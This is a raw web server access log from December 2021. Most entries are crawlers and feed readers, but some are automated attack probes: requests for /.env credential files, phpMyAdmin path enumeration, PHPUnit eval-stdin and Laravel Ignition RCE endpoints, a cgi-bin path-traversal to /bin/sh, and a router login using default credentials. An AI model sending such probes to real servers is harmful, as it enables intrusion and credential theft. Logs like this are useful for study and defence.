193.252.188.96 - - [09/Dec/2021:18:54:19 +0000] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:20 +0000] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:20 +0000] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:21 +0000] "GET /pma2011/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:21 +0000] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:21 +0000] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:22 +0000] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:22 +0000] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:23 +0000] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:23 +0000] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:24 +0000] "GET /MyAdmin/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:24 +0000] "GET /PMA2020/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:25 +0000] "GET /mysql/db/index.php?lang=en HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:25 +0000] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:27 +0000] "GET /PMA2014/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:27 +0000] "GET /db/index.php?lang=en HTTP/1.1" 301 250 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:27 +0000] "GET /pma2019/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:28 +0000] "GET /PMA2021/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:28 +0000] "GET /program/index.php?lang=en HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
193.252.188.96 - - [09/Dec/2021:18:54:29 +0000] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
157.55.39.86 - - [09/Dec/2021:19:15:30 +0000] "GET /robots.txt HTTP/1.1" 301 238 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.126 - - [09/Dec/2021:19:15:37 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.90.209.81 - - [09/Dec/2021:19:22:06 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
157.90.209.81 - - [09/Dec/2021:19:22:07 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)"
97.107.132.77 - - [09/Dec/2021:19:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
216.244.66.232 - - [09/Dec/2021:19:44:24 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
45.119.86.112 - - [09/Dec/2021:20:11:33 +0000] "GET /wp-login.php HTTP/1.1" 301 239 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
194.104.136.109 - - [09/Dec/2021:20:16:11 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
194.104.136.109 - - [09/Dec/2021:20:16:11 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
194.104.136.109 - - [09/Dec/2021:20:16:11 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
194.104.136.109 - - [09/Dec/2021:20:16:12 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)"
185.27.135.114 - - [09/Dec/2021:20:25:00 +0000] "GET /wp-login.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
216.244.66.232 - - [09/Dec/2021:20:30:28 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.231 - - [09/Dec/2021:20:32:45 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
172.104.217.53 - - [09/Dec/2021:20:41:20 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
37.113.62.111 - - [09/Dec/2021:21:09:20 +0000] "GET / HTTP/1.0" 301 227 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
216.244.66.232 - - [09/Dec/2021:21:16:21 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.231 - - [09/Dec/2021:21:18:19 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
162.142.125.42 - - [09/Dec/2021:21:29:12 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
162.142.125.42 - - [09/Dec/2021:21:29:12 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
128.14.141.34 - - [09/Dec/2021:21:35:18 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
104.248.163.61 - - [09/Dec/2021:21:39:14 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.248.163.61 - - [09/Dec/2021:21:39:14 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
69.164.211.90 - - [09/Dec/2021:21:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
70.37.106.128 - - [09/Dec/2021:21:51:02 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
70.37.106.128 - - [09/Dec/2021:21:51:06 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
24.4.91.228 - - [09/Dec/2021:21:51:08 +0000] "GET /.well-known/security.txt HTTP/1.1" 301 251 "-" "Go-http-client/1.1"
24.4.91.228 - - [09/Dec/2021:21:51:09 +0000] "GET /security.txt HTTP/1.1" 301 239 "-" "Go-http-client/1.1"
216.244.66.232 - - [09/Dec/2021:22:01:51 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.231 - - [09/Dec/2021:22:04:54 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
34.77.162.22 - - [09/Dec/2021:22:12:27 +0000] "GET / HTTP/1.1" 301 228 "-" "Expanse indexes the network perimeters of our customers. If you have any questions or concerns, please reach out to: scaninfo@expanseinc.com"
69.164.211.90 - - [09/Dec/2021:22:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
142.93.216.51 - - [09/Dec/2021:22:47:03 +0000] "\x16\x03\x01\x01\xfc\x01" 400 226 "-" "-"
216.244.66.231 - - [09/Dec/2021:22:50:17 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.130.26 - - [09/Dec/2021:22:50:34 +0000] "GET /blog/2016/1/24/ThinkPadTravelAdapter.html HTTP/1.1" 301 268 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.231 - - [09/Dec/2021:23:36:05 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
97.107.141.188 - - [09/Dec/2021:23:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
45.155.205.233 - - [10/Dec/2021:00:01:17 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
216.244.66.232 - - [10/Dec/2021:00:19:05 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
144.76.186.38 - - [10/Dec/2021:00:20:15 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
144.76.186.38 - - [10/Dec/2021:00:20:19 +0000] "GET /blog/2011/7/17/Gaining%20root%20on%25 HTTP/1.1" 301 258 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
216.244.66.231 - - [10/Dec/2021:00:21:37 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
45.155.205.233 - - [10/Dec/2021:00:22:21 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.241.209.81 - - [10/Dec/2021:00:28:44 +0000] "GET /ReportServer HTTP/1.1" 301 242 "-" "Mozilla/5.0 zgrab/0.x"
50.116.54.8 - - [10/Dec/2021:00:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
185.173.35.53 - - [10/Dec/2021:00:42:22 +0000] "GET / HTTP/1.0" 301 227 "-" "NetSystemsResearch studies the availability of various services across the internet. Our website is netsystemsresearch.com"
37.113.62.111 - - [10/Dec/2021:00:50:41 +0000] "GET / HTTP/1.0" 301 227 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
45.155.205.233 - - [10/Dec/2021:00:51:41 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
51.222.253.15 - - [10/Dec/2021:01:22:57 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
97.107.132.77 - - [10/Dec/2021:01:41:17 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
137.184.38.38 - - [10/Dec/2021:01:52:21 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
183.159.75.34 - - [10/Dec/2021:02:21:21 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 301 277 "-" "-"
167.71.139.216 - - [10/Dec/2021:02:30:56 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
167.71.139.216 - - [10/Dec/2021:02:30:56 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.155.205.233 - - [10/Dec/2021:02:31:57 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
216.244.66.232 - - [10/Dec/2021:02:36:15 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
97.107.132.77 - - [10/Dec/2021:02:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
136.144.41.117 - - [10/Dec/2021:02:46:07 +0000] "GET / HTTP/1.1" 301 230 "-" "Linux Gnu (cow)"
64.62.197.182 - - [10/Dec/2021:02:46:12 +0000] "GET / HTTP/1.1" 301 230 "-" "-"
123.125.109.223 - - [10/Dec/2021:02:48:44 +0000] "GET / HTTP/1.1" 301 227 "-" "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"
45.132.227.209 - - [10/Dec/2021:02:49:07 +0000] "HEAD / HTTP/1.1" 301 - "-" "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
34.254.180.140 - - [10/Dec/2021:02:54:38 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"
66.249.70.80 - - [10/Dec/2021:02:57:19 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.78 - - [10/Dec/2021:02:57:19 +0000] "GET /ads.txt HTTP/1.1" 301 234 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.155.205.233 - - [10/Dec/2021:03:12:49 +0000] "GET /console/ HTTP/1.1" 301 238 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
40.77.167.1 - - [10/Dec/2021:03:18:02 +0000] "GET /blog/2011/10/1/Inside%20the%20LinkStar%20ViaSat%20Satellite%20Modem.html HTTP/1.1" 301 289 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
216.244.66.232 - - [10/Dec/2021:03:22:10 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
185.191.171.12 - - [10/Dec/2021:03:27:55 +0000] "GET /robots.txt HTTP/1.1" 301 237 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.14 - - [10/Dec/2021:03:27:56 +0000] "GET /projects/pelco/10000000D.dsf HTTP/1.1" 301 255 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
50.116.54.8 - - [10/Dec/2021:03:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
91.208.197.96 - - [10/Dec/2021:03:45:35 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:68.0) Gecko/20100101 Firefox/68.0"
42.83.147.34 - - [10/Dec/2021:03:45:48 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/74.0.3729.169 Safari/537.36"
40.77.167.71 - - [10/Dec/2021:03:49:34 +0000] "GET /blog/2012/12/4/The%20Costs%20of%20Thread%20Synchronization.html HTTP/1.1" 301 282 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
175.100.20.222 - - [10/Dec/2021:03:51:09 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
175.100.20.222 - - [10/Dec/2021:03:51:10 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
42.193.45.103 - - [10/Dec/2021:03:52:27 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36"
66.249.64.162 - - [10/Dec/2021:04:03:07 +0000] "GET /robots.txt HTTP/1.1" 301 238 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.162 - - [10/Dec/2021:04:03:08 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
216.244.66.232 - - [10/Dec/2021:04:10:24 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
45.155.205.233 - - [10/Dec/2021:04:12:22 +0000] "GET /_ignition/execute-solution HTTP/1.1" 301 256 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.155.205.233 - - [10/Dec/2021:04:34:27 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
69.164.211.90 - - [10/Dec/2021:04:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
157.55.39.194 - - [10/Dec/2021:04:43:46 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.27 - - [10/Dec/2021:04:43:58 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
154.89.5.82 - - [10/Dec/2021:04:59:52 +0000] "GET / HTTP/1.0" 301 230 "-" "-"
40.77.167.1 - - [10/Dec/2021:05:06:42 +0000] "GET / HTTP/1.1" 301 227 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.61.146.242 - - [10/Dec/2021:05:18:00 +0000] "POST /admin HTTP/1.1" 301 235 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F"
205.185.123.233 - - [10/Dec/2021:05:18:48 +0000] "GET https://api.38666.com/odd/app/download/list HTTP/1.1" 301 251 "https://api.38666.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
205.185.125.104 - - [10/Dec/2021:05:20:12 +0000] "GET https://api.38666.com/odd/app/download/list HTTP/1.1" 301 251 "https://api.38666.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
45.155.205.233 - - [10/Dec/2021:05:25:45 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 226 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.79.148.82 - - [10/Dec/2021:05:41:18 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
45.137.23.232 - - [10/Dec/2021:05:51:32 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 zgrab/0.x"
109.237.103.123 - - [10/Dec/2021:05:53:29 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [10/Dec/2021:05:53:29 +0000] "POST /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [10/Dec/2021:05:53:29 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.103.123 - - [10/Dec/2021:05:53:29 +0000] "POST /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
209.141.54.111 - - [10/Dec/2021:06:09:55 +0000] "GET https://api.38666.com/odd/app/download/list?t=77315256 HTTP/1.1" 301 262 "https://api.38666.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
209.141.62.227 - - [10/Dec/2021:06:13:55 +0000] "GET https://api.38666.com/odd/app/download/list?t=882390678 HTTP/1.1" 301 263 "https://api.38666.com" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
157.55.39.86 - - [10/Dec/2021:06:18:08 +0000] "GET /robots.txt HTTP/1.1" 301 238 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.126 - - [10/Dec/2021:06:18:10 +0000] "GET / HTTP/1.1" 301 228 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
80.82.77.192 - - [10/Dec/2021:06:23:19 +0000] "GET / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
205.185.119.112 - - [10/Dec/2021:06:24:20 +0000] "GET http://dx8.cc/m/ HTTP/1.1" 301 225 "http://dx8.cc" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
94.232.43.63 - - [10/Dec/2021:06:25:56 +0000] "\x03" 400 226 "-" "-"
94.232.43.63 - - [10/Dec/2021:06:25:56 +0000] "\x03" 400 226 "-" "-"
216.244.66.232 - - [10/Dec/2021:06:32:48 +0000] "GET /robots.txt HTTP/1.1" 301 240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
104.248.161.159 - - [10/Dec/2021:06:38:49 +0000] "GET /.env HTTP/1.1" 301 234 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
104.248.161.159 - - [10/Dec/2021:06:38:49 +0000] "POST / HTTP/1.1" 301 230 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
69.164.211.90 - - [10/Dec/2021:06:41:19 +0000] "GET /blog/atom.xml HTTP/1.1" 301 240 "-" "Feed Wrangler/1.0 (1 subscriber; feed-id=364241; http://feedwrangler.net; Allow like Gecko)"
